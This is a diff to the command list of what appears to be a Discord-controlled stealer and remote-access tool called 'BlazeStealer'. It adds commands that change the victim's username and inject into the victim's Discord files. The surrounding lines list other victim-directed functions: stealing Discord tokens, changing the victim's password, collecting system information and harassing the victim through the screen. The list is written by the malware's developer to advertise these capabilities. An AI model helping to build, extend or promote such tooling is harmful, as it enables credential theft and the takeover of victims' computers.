@@ -45,6 +45,7 @@ $NotInfected - Discord (notinfected666)
 .showtaskbar: Show the victim's task bar.
 .hidetaskbar: Hide the victim's task bar.
 .userpassfucker: Change user password of the victim's computer.
+.usernamefucker: Change username of the victim's computer.
 
 𝕭𝖑𝖆𝖟𝖊𝕾𝖙𝖊𝖆𝖑𝖊𝖗 - 𝕮𝖔𝖒𝖒𝖆𝖓𝖉𝖘 (Part 2)
 .tokens: Get all Discord Tokens to the victim's computer.
@@ -66,6 +67,7 @@ $NotInfected - Discord (notinfected666)
 .sysinfo: Obtain victim's operating system information.
 .infomsg: Sends the user an informative message.
 .questionmsg: Sends the user a question message.
+.discinjection: Infect's the Discord Files on the victim's computer.
 .screentroll: Turns the victim's screen on and off without stopping.
 .screenon: Turn on the victim's screen.
 .screenoff: Turn off the victim's screen.
